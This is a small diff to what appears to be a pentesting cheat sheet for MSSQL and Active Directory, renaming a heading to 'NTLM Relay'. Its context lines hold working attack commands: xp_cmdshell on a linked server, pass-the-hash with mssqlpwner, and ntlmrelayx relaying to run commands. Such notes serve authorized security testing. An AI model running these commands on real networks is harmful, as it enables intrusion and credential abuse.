@@ -170,7 +170,7 @@ EXEC('xp_cmdshell ''powershell whoami''') AT SQL03;
 Enumerate an MSSQL instance:
 - `mssqlpwner -hashes ':d38a856d6126f47a58ebfa34a4b70fef' 'WEB01$'@db01 -windows-auth interactive`
 
-Relay authentication:
+### NTLM Relay:
 *Note: three tools involved: Responder,ntlmrelayx and mssqlpwner*
 
 Command Execution: `ntlmrelayx.py --no-http-server -smb2support -t 192.168.156.6 -c 'command here'`
